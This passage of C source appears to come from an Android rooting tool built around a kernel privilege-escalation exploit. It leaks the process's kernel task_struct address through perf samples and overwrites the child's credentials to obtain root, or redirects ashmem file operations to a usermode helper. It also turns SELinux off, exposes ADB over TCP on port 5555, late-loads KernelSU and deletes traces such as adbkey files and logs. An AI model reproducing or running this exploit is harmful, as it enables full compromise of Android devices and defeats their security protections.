    pr_error("cannot install late-load recovery script errno=%d\n", errno);
    return 0;
  }

  const char *script =
    "#!/system/bin/sh\n"
    "STATE_DIR=/data/adb/anchor\n"
    "STATE=$STATE_DIR/bootstrap.state\n"
    "mkdir -p \"$STATE_DIR\" && chmod 700 \"$STATE_DIR\"\n"
    "state() { printf 'result=%s\\nrc=%s\\nselinux=%s\\n' \"$1\" \"${2:-}\" \"$(getenforce 2>/dev/null || echo unknown)\" > \"$STATE\"; chmod 600 \"$STATE\"; }\n"
    "state late-load-running\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -n 1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksud; fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
    "if [ -f \"$KSUD\" ]; then chmod 755 \"$KSUD\" 2>/dev/null; fi\n"
    "POLICY_REPAIR=/data/adb/anchor/repair_selinux_policy.sh\n"
    "POLICY_RC=127\n"
    "if grep -qx 'result=success' $STATE_DIR/policy-repair.state 2>/dev/null; then\n"
    "  printf 'late-load policy repair skipped: immediate repair already succeeded\\n' >>$STATE_DIR/policy-repair.log\n"
    "  POLICY_RC=0\n"
    "elif [ -x \"$POLICY_REPAIR\" ]; then\n"
    "  ANCHOR_POLICY_REPAIR_STAGE=late-load \"$POLICY_REPAIR\"\n"
    "  POLICY_RC=$?\n"
    "fi\n"
    "if [ \"$POLICY_RC\" -eq 0 ]; then state late-load-policy-repaired \"$POLICY_RC\"; else state late-load-policy-repair-failed \"$POLICY_RC\"; fi\n"
    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed -n 's/^package://p' | head -n 1)\n"
    "if [ -z \"$APK\" ]; then APK=$(pm path me.weishu.kernelsu 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
    "if [ -z \"$APK\" ]; then APK=$(pm path com.kowx712.supermanager 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
    "MANAGER_LOG=$STATE_DIR/manager-selection.log\n"
    "if [ -x \"$KSUD\" ] && [ -n \"$APK\" ]; then\n"
    "  \"$KSUD\" kernel dynamic-manager set-apk \"$APK\" >\"$MANAGER_LOG\" 2>&1\n"
    "  MANAGER_RC=$?\n"
    "else\n"
    "  MANAGER_RC=127\n"
    "  printf 'ksud=%s\\napk=%s\\n' \"$KSUD\" \"$APK\" >\"$MANAGER_LOG\"\n"
    "fi\n"
    "printf 'ksud=%s\\napk=%s\\nrc=%s\\n' \"$KSUD\" \"$APK\" \"$MANAGER_RC\" >>\"$MANAGER_LOG\"\n"
    "if [ -x \"$KSUD\" ]; then\n"
    "  \"$KSUD\" resetprop -p persist.adb.tcp.port 5555 >/dev/null 2>&1\n"
    "  \"$KSUD\" resetprop service.adb.tcp.port 5555 >/dev/null 2>&1\n"
    "fi\n"
    "OPTIONS=/data/user/0/com.anchor.bootstrap/no_backup/options.conf\n"
    "if grep -qx 'disable_usb_debugging=1' \"$OPTIONS\" 2>/dev/null; then\n"
    "  settings put global adb_enabled 0 >/dev/null 2>&1\n"
    "fi\n"
    "state late-load-complete \"$POLICY_RC\"\n"
    "rm -f /data/adb/late-load.d/99-anchor-recover.sh\n";

  if (!publish_root_script(path, script)) {
    pr_error("cannot write late-load recovery script errno=%d\n", errno);
    return 0;
  }
  return 1;
}
#endif

static int write_root_script_at(const char *script_path) {
  if (strcmp(script_path, ROOT_SCRIPT_PATH) == 0)
    prepare_bridge_state_dir();
  const char *script =
    "#!/system/bin/sh\n"
    "STATE_DIR=/data/adb/anchor\n"
    "STATE=$STATE_DIR/bootstrap.state\n"
    "mkdir -p \"$STATE_DIR\" && chmod 700 \"$STATE_DIR\"\n"
    "state() { printf 'result=%s\\n' \"$1\" > \"$STATE\"; chmod 600 \"$STATE\"; }\n"
    "cleanup() { rm -f \"$0\" /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 /data/local/tmp/a/ghostlock_postroot.log /data/local/tmp/a/adbkey /data/local/tmp/a/adbkey.pub /data/local/tmp/a/e; }\n"
    "trap cleanup EXIT\n"
    "rm -f /data/local/tmp/a/ghostlock_postroot.log\n"
    "state root-handoff-running\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -n 1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksud; fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -n 1); fi\n"
    "if [ -f \"$KSUD\" ]; then chmod 755 \"$KSUD\" 2>/dev/null; fi\n"
    "if [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" --package-name com.resukisu.resukisu </dev/null >/dev/null 2>&1 &\n"
    "  for w in $(seq 1 30); do\n"
    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
    "    sleep 1\n"
    "  done\n"
    "  if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "    for w in $(seq 1 15); do\n"
    "      grep -qx 'result=late-load-complete' \"$STATE\" 2>/dev/null && break\n"
    "      sleep 1\n"
    "    done\n"
    "    APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed -n 's/^package://p' | head -n 1)\n"
    "    if [ -z \"$APK\" ]; then APK=$(pm path me.weishu.kernelsu 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
    "    if [ -z \"$APK\" ]; then APK=$(pm path com.kowx712.supermanager 2>/dev/null | sed -n 's/^package://p' | head -n 1); fi\n"
    "    MANAGER_LOG=$STATE_DIR/manager-selection.log\n"
    "    if [ -x \"$KSUD\" ] && [ -n \"$APK\" ]; then\n"
    "      \"$KSUD\" kernel dynamic-manager set-apk \"$APK\" >\"$MANAGER_LOG\" 2>&1\n"
    "      MANAGER_RC=$?\n"
    "    else\n"
    "      MANAGER_RC=127\n"
    "      printf 'ksud=%s\\napk=%s\\n' \"$KSUD\" \"$APK\" >\"$MANAGER_LOG\"\n"
    "    fi\n"
    "    printf 'ksud=%s\\napk=%s\\nrc=%s\\n' \"$KSUD\" \"$APK\" \"$MANAGER_RC\" >>\"$MANAGER_LOG\"\n"
    "    if grep -qx 'result=success' $STATE_DIR/policy-repair.state 2>/dev/null; then state root-ready-policy-repaired; elif grep -qx 'result=disabled' $STATE_DIR/policy-repair.state 2>/dev/null; then state root-ready-policy-repair-disabled; elif grep -qx 'result=failed' $STATE_DIR/policy-repair.state 2>/dev/null; then state root-ready-policy-repair-failed; else state root-ready-policy-repair-pending; fi\n"
    "  else state root-unavailable; fi\n"
    "else\n"
    "  state root-unavailable\n"
    "fi\n"
    "exit 0\n";
  if (!publish_root_script(script_path, script)) {
    pr_error("cannot write root handoff script errno=%d\n", errno);
    return 0;
  }
  return 1;
}

static int write_root_script(void) {
  return write_root_script_at(ROOT_SCRIPT_PATH);
}

static int write_umh_root_script(void) {
  return write_root_script_at(UMH_SCRIPT_PATH);
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static int read_exact_timeout(int fd, void *buf, size_t size, int timeout_msec) {
  unsigned char *p = buf;
  size_t done = 0;
  while (done < size && timeout_msec > 0) {
    struct pollfd pfd = {.fd = fd, .events = POLLIN | POLLHUP};
    int step = timeout_msec > 100 ? 100 : timeout_msec;
    int ready = poll(&pfd, 1, step);
    timeout_msec -= step;
    if (ready < 0) {
      if (errno == EINTR) continue;
      return 0;
    }
    if (ready == 0) continue;
    ssize_t got = read(fd, p + done, size - done);
    if (got <= 0) return 0;
    done += (size_t)got;
  }
  return done == size;
}

static void close_fd(int *fd) {
  if (*fd >= 0) {
    close(*fd);
    *fd = -1;
  }
}

/* The candidate child blocks waiting for C/G.  Every failure path must release
 * it before retrying, otherwise the next UI click inherits a stale task and
 * its open pipe endpoints. */
static void dispose_candidate_child(struct child_pipes *p, pid_t child) {
  if (p->cmd_w >= 0) (void)write(p->cmd_w, "G", 1);
  close_fd(&p->task_r);
  close_fd(&p->cmd_w);
  close_fd(&p->uid_r);

  if (child <= 0) return;
  for (int elapsed = 0; elapsed < 2000; elapsed += 20) {
    pid_t waited = waitpid(child, NULL, WNOHANG);
    if (waited == child || waited < 0) return;
    usleep(20000);
  }
  kill(child, SIGKILL);
  waitpid(child, NULL, 0);
}

/* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
static void park_rooted_child(void) {
  FILE *f = fopen("/proc/self/oom_score_adj", "w");
  if (f) {
    fputs("-1000", f);
    fclose(f);
  }
  for (int fd = 3; fd < 256; fd++) close(fd);
  for (;;) pause();
}

static void child_main(struct child_pipes *p) {
  /* A failed launcher must not leave a candidate task alive for a later UI
   * retry.  The root-script child is also reaped before this child returns. */
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  if (getppid() == 1) _exit(1);
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
   * this address, so two runs must agree or the leak is discarded. */
  uintptr_t my_task = perf_find_task();
  int leak_agreed = 0;
  for (int i = 0; i < 2 && my_task; i++) {
    uintptr_t again = perf_find_task();
    if (again == my_task) { leak_agreed = 1; break; }
    my_task = again;
  }
  if (!leak_agreed) my_task = 0;
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  /* /data/adb is inaccessible to the shell process.  Create both the
   * root-owned state directory and its short-lived handoff script only after
   * the credential transition has completed. */
  if (load_policy_mode && !deploy_policy_repair_script()) {
    write_bridge_state("root-ready-policy-repair-pending");
    park_rooted_child();
  }
  if (!load_policy_mode) {
    write_policy_repair_disabled_state();
    write_bridge_state("root-ready-policy-repair-disabled");
  }
  if (!write_root_script() || access(ROOT_SCRIPT_PATH, X_OK) != 0) {
    write_bridge_state("root-script-unavailable");
    park_rooted_child();
  }
#if ANCHOR_ENABLE_LATELOAD_RECOVERY
  if (load_policy_mode && !write_lateload_recovery_script()) {
    write_bridge_state("late-load-script-unavailable");
    park_rooted_child();
  }
#else
  /* Do not leave a Recovery script from an earlier build armed. */
  unlink(LATELOAD_RECOVERY_PATH);
#endif
  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
   * daemons must not keep their write ends open. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  pid_t gc = fork();
  if (gc == 0) {
    if (setsid() < 0) { /* continue */ }
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", ROOT_SCRIPT_PATH, NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  cleanup_tmp_compat_files();
  park_rooted_child();
}

static pid_t spawn_child(struct child_pipes *p) {
  *p = (struct child_pipes){
      .task_r = -1, .task_w = -1, .cmd_r = -1,
      .cmd_w = -1, .uid_r = -1, .uid_w = -1};
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0) return -1;
  if (pipe(p2) < 0) {
    close(p1[0]); close(p1[1]);
    return -1;
  }
  if (pipe(p3) < 0) {
    close(p1[0]); close(p1[1]); close(p2[0]); close(p2[1]);
    return -1;
  }
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) {
    close_fd(&p->task_r); close_fd(&p->task_w);
    close_fd(&p->cmd_r); close_fd(&p->cmd_w);
    close_fd(&p->uid_r); close_fd(&p->uid_w);
    return -1;
  }
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets && active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");

  /* Phase 1: Disable SELinux */
  int selinux_ok = check_selinux_off();
  int umh_available = active_offsets &&
      active_offsets->off_system_unbound_wq &&
      active_offsets->off_call_usermodehelper_exec_work &&
      active_offsets->off_ashmem_misc_fops;
  pr_info("UMH policy: available=%d force=%d\n", umh_available, force_umh_mode);
  if (force_umh_mode) {
    if (!umh_available) {
      pr_error("forced UMH requested but exact UMH offsets are unavailable\n");
      cleanup_tmp_compat_files();
      return 1;
    }
    if (!write_umh_root_script()) {
      pr_error("UMH root handoff script unavailable\n");
      cleanup_tmp_compat_files();
      return 1;
    }
    pr_info("UMH path: fops redirect (mode=4)...\n");
    slab_drain();
    TIMER("pre-UMH drain");
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    TIMER("fops redirect done");
    selinux_ok = check_selinux_off();
  }
  if (force_umh_mode && !root_child_done) {
    pr_error("forced UMH failed; refusing W1/W2 fallback\n");
    cleanup_tmp_compat_files();
    return 1;
  }
  if (!force_umh_mode && !selinux_ok) {
    /* Match upstream behavior: drain once before the five W1 attempts, not
     * once inside every retry. */
    slab_drain();
    TIMER("pre-W1 drain");
    for (int att = 1; att <= 5 && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/5\n", att);
      run_w1_attempt(att);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    TIMER("Write 1 complete");
  } else if (root_child_done) {
    selinux_ok = 1;
  } else {
    pr_success("SELinux already off\n");
  }

  if (root_child_done) {
    pr_success("UMH root done — skipping W2\n");
    TIMER("exploit complete (UMH)");
    int su_ready = 0;
    pr_info("waiting for su...\n");
    for (int i = 0; i < 60; i++) {
      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
        pr_success("su ready\n");
        if (load_policy_mode) {
          int policy_rc = run_policy_repair_with_retries("immediate");
          if (policy_rc == 0)
            pr_success("immediate repaired policy load done\n");
          else
            pr_error("immediate repaired policy load failed; late-load recovery remains armed\n");
        } else {
          pr_info("load_policy disabled by user option\n");
        }
        su_ready = 1;
        break;
      }
      sleep(1);
    }
    return su_ready ? 0 : 1;
  }

  /* Phase 2: Find child task_struct + cred overwrite */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); cleanup_tmp_compat_files(); return 1; }

  uintptr_t child_task = 0;
  if (!read_exact_timeout(pipes.task_r, &child_task, sizeof(child_task), 5000))
    child_task = 0;
  close_fd(&pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    /* perf failed (seccomp?) — retry once */
    pr_info("perf returned 0, retrying...\n");
    dispose_candidate_child(&pipes, child);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); cleanup_tmp_compat_files(); return 1; }
    if (!read_exact_timeout(pipes.task_r, &child_task, sizeof(child_task), 5000))
      child_task = 0;
    close_fd(&pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    dispose_candidate_child(&pipes, child);
    cleanup_tmp_compat_files();
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  int got_root = 0;
  for (int round = 1; round <= 10 && !got_root; round++) {
    pr_info("round %d/10: cred write\n", round);
    if (!run_isolated_write(child_task + TASK_CRED_OFF, "W2: cred", 2,
                            round, 1))
      continue;
    usleep(50000);
    uint32_t child_uid = 9999;
    if (write(pipes.cmd_w, "C", 1) != 1 ||
        !read_exact_timeout(pipes.uid_r, &child_uid, sizeof(child_uid), 2000)) {
      pr_error("round %d: candidate child did not answer\n", round);
      break;
    }
    pr_info("child uid = %u\n", child_uid);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  if (pipes.cmd_w >= 0) (void)write(pipes.cmd_w, "G", 1);
  close_fd(&pipes.cmd_w);
  close_fd(&pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    dispose_candidate_child(&pipes, child);
    cleanup_tmp_compat_files();
    return 1;
  }

  sleep(2);
  TIMER("exploit complete");

  /* Wait for KSU su to become available, then fix SELinux policycap */
  int su_ready = 0;
  pr_info("waiting for su...\n");
  for (int i = 0; i < 60; i++) {
    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
      pr_success("su ready\n");
      if (load_policy_mode) {
        int policy_rc = run_policy_repair_with_retries("immediate");
        if (policy_rc == 0)
          pr_success("immediate repaired policy load done\n");
        else
          pr_error("immediate repaired policy load failed; late-load recovery remains armed\n");
      } else {
        pr_info("load_policy disabled by user option\n");
      }
      su_ready = 1;
      break;
    }
    sleep(1);
  }

  return su_ready ? 0 : 1;
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_port;
extern int mini_adb_shell(const char *cmd);

/* This is overridden by the standalone app build. The official Manager
 * package remains the dynamic-manager target in write_root_script(); only the
 * binary executed by the remote shell belongs to the Bootstrap package. */
#ifndef ANCHOR_BOOTSTRAP_PACKAGE
#define ANCHOR_BOOTSTRAP_PACKAGE "com.anchor.bootstrap"
#endif

/* --bootstrap mode: the app process is seccomp-filtered.  With the one-time
 * TCP ADB setup in place, enter the shell context before any exploit stage so
 * W1 and W2 use the same execution environment as the proven adb-shell path.
 */
static int run_bootstrap(void) {
  /* The app drains this process's stdout into its private diagnostic store.
   * The remote helper already disables buffering, but bootstrap diagnostics
   * must remain available to the app while it is running. */
  set_unbuffer();
  log_startup_context();
  if (!acquire_bootstrap_lock()) return 1;
  int result = 1;

  /* Wait for adb TCP on the configured port. */
  int adb_port = 5555;
  char port_buf[32] = {};
  read_first_line("/data/local/tmp/a/adb_port", port_buf, sizeof(port_buf));
  if (port_buf[0]) adb_port = atoi(port_buf);
  if (adb_port <= 0 || adb_port > 65535) adb_port = 5555;
  pr_info("Waiting for adb TCP on port %d...\n", adb_port);
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(adb_port),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port %d (attempt %d)\n", adb_port, i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP %d after 30s\n", adb_port);
  goto done;
tcp_ready:
  usleep(200000);
  mini_adb_port = adb_port;
  pr_info("Connecting via mini-adb on port %d...\n", adb_port);
  /* The shell spawned by adbd does not inherit this app process's
   * environment. It can execute a known /data/app path but cannot enumerate
  * that directory, so derive the packaged library path from `pm path`. */
  const char *force_arg = env_flag("ANCHOR_FORCE_UMH", 0) ? " --force-umh" : "";
  const char *load_policy_arg = env_flag("ANCHOR_LOAD_POLICY", 0) ? " --load-policy" : "";
  const char *policy_script = getenv(POLICY_REPAIR_SOURCE_ENV);
  char policy_script_env[PATH_MAX + 64] = "";
  if (load_policy_arg[0]) {
    if (!policy_script || !policy_script[0] || strchr(policy_script, '\'') ||
        strchr(policy_script, '"') || strchr(policy_script, '\n')) {
      pr_error("policy repair deployment source is unavailable; repair will fail\n");
    } else {
      snprintf(policy_script_env, sizeof(policy_script_env),
               POLICY_REPAIR_SOURCE_ENV "='%s' ", policy_script);
    }
  }
  /* The remote adbd shell is a new process and does not inherit the app
   * process environment. Forward the validated pselect override explicitly,
   * preserving the upstream form: PSELECT_SHIFT=-2 "$APPBIN". */
  char pselect_env[64] = "";
  const char *pselect_shift = getenv("PSELECT_SHIFT");
  if (pselect_shift && pselect_shift[0]) {
    char *end = NULL;
    long shift = strtol(pselect_shift, &end, 10);
    if (end != pselect_shift && *end == '\0' && shift >= -14 && shift <= 14) {
      snprintf(pselect_env, sizeof(pselect_env), "PSELECT_SHIFT=%ld ", shift);
    } else {
      pr_warning("invalid PSELECT_SHIFT for remote shell: %s\n", pselect_shift);
    }
  }
  char remote_cmd[PATH_MAX + 2304];
  snprintf(remote_cmd, sizeof(remote_cmd),
    "rm -f /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 "
    "/data/local/tmp/a/ghostlock_postroot.log /data/local/tmp/a/adbkey "
    "/data/local/tmp/a/adbkey.pub /data/local/tmp/a/e; "
    "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " 2>/dev/null | sed -n 's/^package://p' | head -n 1); "
    "if [ -z \"$APK\" ]; then RC=127; STAGE=apk-not-found; "
    "else APPBIN=${APK%%/base.apk}/lib/arm64/libanchor.so; "
    "if [ -x \"$APPBIN\" ]; then %s%s\"$APPBIN\"%s%s; RC=$?; STAGE=anchor-exited; "
    "else RC=126; STAGE=appbin-not-executable; fi; fi; "
    "printf '\\n__ANCHOR_STAGE=%%s\\n__ANCHOR_RC=%%s\\n' \"$STAGE\" \"$RC\"; exit \"$RC\"",
    policy_script_env, pselect_env, force_arg, load_policy_arg);
  int adb_ret = mini_adb_shell(remote_cmd);
  pr_info("mini-adb returned %d\n", adb_ret);
  result = adb_ret;
done:
  release_bootstrap_lock();
  return result;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets && active_offsets->kimage_text_base) {
    kaslr_base = active_offsets->kimage_text_base;
  }
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    pr_info("Write 1 attempt %d/20\n", att);
    run_w1_attempt(att);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

int main(int argc, char **argv) {
    handle_umh_mode(argc, argv);
    force_umh_mode = env_flag("ANCHOR_FORCE_UMH", 0);
    load_policy_mode = env_flag("ANCHOR_LOAD_POLICY", 0);
    int bootstrap = 0;
    int write1 = 0;
    for (int i = 1; i < argc; i++) {
      if (strcmp(argv[i], "--force-umh") == 0) force_umh_mode = 1;
      else if (strcmp(argv[i], "--load-policy") == 0) load_policy_mode = 1;
      else if (strcmp(argv[i], "--bootstrap") == 0) bootstrap = 1;
      else if (strcmp(argv[i], "--write1") == 0) write1 = 1;
    }
    if (argc >= 2 && strcmp(argv[1], "--fix-policy") == 0) {
      return fix_selinux_policy_c(argc >= 3 ? argv[2] : "immediate");
    }
    if (bootstrap)
        return run_bootstrap();
    if (write1)
        return run_write1_only();
    return run_exploit(argc, argv);
}
